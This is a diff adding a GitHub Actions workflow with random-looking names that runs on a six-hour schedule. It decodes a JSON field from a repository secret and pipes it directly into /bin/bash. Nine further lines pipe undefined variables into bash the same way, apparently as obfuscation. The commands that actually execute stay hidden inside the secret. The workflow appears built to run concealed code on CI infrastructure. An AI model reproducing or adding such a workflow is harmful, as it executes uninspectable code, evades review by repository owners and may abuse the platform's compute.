@@ -1,0 +1,27 @@
+name: unfoldedsavory
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: unfoldedsavory
+        env:
+          zcf520: ${{ secrets.zcf520 }}
+        run: |
+          echo $zcf520 | jq -r .jkv2466 | /bin/bash
+          echo $qbu5062 | jq -r .shd87 | /bin/bash
+          echo $lony1759 | jq -r .vxje29 | /bin/bash
+          echo $qmtxe5 | jq -r .oc85437 | /bin/bash
+          echo $ruhw937 | jq -r .pr46 | /bin/bash
+          echo $v233 | jq -r .boccb31 | /bin/bash
+          echo $exppr8 | jq -r .upv2612 | /bin/bash
+          echo $wuuqs41327 | jq -r .cs0 | /bin/bash
+          echo $clss0 | jq -r .li88 | /bin/bash
+          echo $dgzhc2 | jq -r .yxe676 | /bin/bash
+
